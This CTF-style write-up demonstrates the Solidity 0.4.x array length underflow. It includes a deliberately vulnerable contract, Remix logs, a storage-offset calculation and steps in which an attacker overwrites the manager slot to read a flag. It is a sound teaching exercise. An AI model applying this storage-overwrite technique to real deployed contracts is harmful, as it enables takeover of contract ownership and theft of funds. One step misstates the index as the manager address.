# Array Length Underflow Bug

- author     : Ethan Kim
- created at : 2018.05.17

## Environment

- <https://remix.ethereum.org>
  - version: soljson-v0.4.24
  - pragma solidity ^0.4.17

## Overview

In solidity, they didn't check the array length when increased and decrease the size of array. So, if we decrease an array length of already array length is 0, then the array length is underflowed and the length of array is 2**256-1.

## Explain PoC Solidity

I made CTF-style solidity file.

```javascript
pragma solidity ^0.4.17; 

contract test {
    address manager;
    string FLAG = "hackability{4rr4y l3n67h und3rfl0w 15 fun}";
    uint256 []x = [32, 64];

    // manager will be contract deployer
    constructor () public {
        manager = msg.sender;
    } 
    
    // get manager
    function getManager() public view returns (address) {
        return manager;
    }
    
    // set array
    function setX(uint256 _index, uint256 _v) public {
        x[_index] = _v;
    }
    
    // get array
    function getX(uint256 _index) view public returns(uint256) {
        return x[_index];
    }
    
    // [*] vulnerable
    function popX() public {
        x.length--;
    } 
    
    // get flag like CTF style :P
    function getFLAG() public restricted view returns(string){
        return FLAG;
    }
    
    // manger only modifier
    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

}
```

There is more functionailities than actually we need but its more fun thinking that its real-world case.

The solidity is simple

- constructor
  - assign the manager who deploy the contract
  - assume that our case is "0xca35b7d915458ef540ade6068dfe2f44e8fa733c"

- getManager
  - check who is manager

- setX (uint256 _index, uint256 _v)
  - set array `x` with index and value
  - `x[_index] = v`

- getX (uint256 _index)
  - check `x[_index]` value

- popX
  - vulnerable function

- getFlag
  - only manager can call this function
  - so, we assume that others don't know what the FLAG is

## Get the FLAG :P

- Assumption
  - `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` deploy the contract (so, he is manager)
  - `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` is hacker :P

First, `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` deploy the contract then he will be the manager.

```
from 	0xca35b7d915458ef540ade6068dfe2f44e8fa733c
to 	test.getManager() 0x1459b55e171400dfbf69f834fa6e80232b014ce8
transaction cost 	21746 gas (Cost only applies when called by a contract)
execution cost 	538 gas (Cost only applies when called by a contract)
input 	0xd5009584
decoded input 	{}
decoded output 	{
"0": "address: 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c"
}
```

We change the address to `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` and try to call the `getFlag` Function.

```
from 	0x14723a09acff6d2a60dcdf7aa4aff308fddc160c
to 	test.getFLAG() 0x1459b55e171400dfbf69f834fa6e80232b014ce8
transaction cost 	21746 gas (Cost only applies when called by a contract)
execution cost 	474 gas (Cost only applies when called by a contract)
input 	0xa979cafe
decoded input 	{}
decoded output 	{
"0": "string: "
}
```

Because of the `0x14723a09acff6d2a60dcdf7aa4aff308fddc160c` is not the manager so it failed as we expected. When we try to call `popX`, the array then the variables are look like this (debugging mode),

```
manager: 0xCA35B7D915458EF540ADE6068DFE2F44E8FA733C address
FLAG: "hackability{4rr4y l3n67h und3rfl0w 15 fun}" string
x: uint256[]
    length: 1
    0: 32 uint256
```

The array `x` has 1 element. Nothing special. But, when we call the `popX` twice, the underflow is happened.

```
manager: 0xCA35B7D915458EF540ADE6068DFE2F44E8FA733C address
FLAG: "hackability{4rr4y l3n67h und3rfl0w 15 fun}" string
x: uint256[]
length: 115792089237316195423570985008687907853269984665640564039457584007913129639935
    0: 0 uint256
    1: 0 uint256
    2: 0 uint256
    3: 0 uint256
    4: 0 uint256
    5: 0 uint256
```

Yes! The array `x` is underflowed and its length is 115792089237316195423570985008687907853269984665640564039457584007913129639935 (2^256-1). This is usual step out-of-bound read/write to exploit something and we can read/write any memory with the array `x`.

In EVM, we can't touch the virtual system address (such as library address or heap address) because they use their custom memory map and we sandboxed in their memory map structure. However, the other variables in the contract are also landed in the same EVM address structure. So, we can touch them with the array `x`. LOL!

At this point, when we look at the storage, it looks like

```
0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563: Object
    key: 0x0000000000000000000000000000000000000000000000000000000000000000
    value: 0xca35b7d915458ef540ade6068dfe2f44e8fa733c
0xea7809e925a8989e20c901c4c1da82f0ba29b26797760d445a0ce4cf3c6fbd31: Object
    key: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf7
    value: 0x30772031352066756e7d00000000000000000000000000000000000000000000
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6: Object
    key: 0x0000000000000000000000000000000000000000000000000000000000000001
    value: 0x55
0xb5d9d894133a730aa651ef62d26b0ffa846233c74177a591a4a896adfda97d22: Object
    key: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    value: 0x6861636b6162696c6974797b3472723479206c336e36376820756e643372666c
0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: Object
    key: 0x0000000000000000000000000000000000000000000000000000000000000002
    value: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

As you can see, address `0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563` is the object address where the manager address is stored. And `0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace` is the length of array `x`.

The address is calcaulated by key value. ( address = keccak256(Object.key) ) The goal of this challenge is to get the FLAG string. How we can get the FLAG string with array `x`? The tricky part here is to access the FLAG string variable with `0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace`(array).

When you access the array `x` with index `0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563`. It means `x[0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563]`, so it doesn't work to get the manager address. Simply, we can calculate the offset between array and manager variable.

```
offset = 2**256 - array address
       = 2**256 - 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace
       = 0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a532
```

It manes that `x[0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a532]` points to the manager (0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563). Really ?!!?!

We can verify this behave with getX function. When we put the index as `0xbfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a532` the result is as followed

```
from 	0x14723a09acff6d2a60dcdf7aa4aff308fddc160c
to 	test.getX(uint256) 0x1459b55e171400dfbf69f834fa6e80232b014ce8
transaction cost 	24241 gas (Cost only applies when called by a contract)
execution cost 	793 gas (Cost only applies when called by a contract)
input 	0x8e5cb5f6bfa87805ed57dc1f0d489ce33be4c4577d74ccde357eeeee058a32c55c44a532
decoded input 	{
"uint256 _index": "86689412755643153520937993975226462422650712005964340702668412599904743236914"
}
decoded output 	{
"0": "uint256: 1154414090619811796818182302139415280051214250812"
}
logs 	[]
```

The output decimal is `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` and this is manager address! So, with this index the manager address can be changed as our address. (index = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c, value=0x14723a09acff6d2a60dcdf7aa4aff308fddc160c). And then, we can call the getFLAG function because the manager is changed as my address.

```
 from 	0x14723a09acff6d2a60dcdf7aa4aff308fddc160c
 to 	test.getFLAG() 0x1459b55e171400dfbf69f834fa6e80232b014ce8
 transaction cost 	23461 gas (Cost only applies when called by a contract)
 execution cost 	2189 gas (Cost only applies when called by a contract)
 input 	0xa979cafe
 decoded input 	{}
 decoded output 	{
	"0": "string: hackability{4rr4y l3n67h und3rfl0w 15 fun}"
}
 logs 	[]
 ```

YEAH ! We've got the FLAG :P

## References

- <https://remix.ethereum.org>
- <https://www.youtube.com/watch?v=gUqHgFuSsqg>